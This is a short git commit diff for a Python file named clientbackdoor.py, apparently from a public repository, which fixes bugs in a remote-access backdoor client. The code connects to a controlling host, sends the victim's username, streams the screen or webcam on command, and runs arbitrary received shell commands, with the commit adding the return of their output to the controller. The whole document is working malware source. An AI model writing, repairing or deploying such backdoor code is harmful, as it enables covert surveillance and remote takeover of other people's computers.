724865a4953c66cc024fab0a05d0eb681a9d6a4d
C0D3RG0D <82378312+C0D3RG0D@users.noreply.github.com>
2022-01-02 13:53:51 +0200

    Update clientbackdoor.py

--- clientbackdoor.py
+++ clientbackdoor.py
@@ -9,16 +9,17 @@ socket_port = 8080
 c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 c.connect((host, socket_port))
 
-c.send(str(getpass.getuser())).encode('utf-8')
+c.send(str(getpass.getuser()).encode('utf-8'))
 
 while True:
 	command_data = c.recv(1024).decode('utf-8')
 
 	if command_data == 'screen':
-		screen = ScreenSharClient(host, 9999)
+		screen = ScreenShareClient(host, 9999)
 		screen.start_stream()
 	if command_data == 'webcam':
 		camera = CameraClient(host, 9999)
 		camera.start_stream()
 	else:
-		sp.call(str(command_data))
+		data = str(command_data)
+		c.send(str(sp.call(data)).encode('utf-8'))
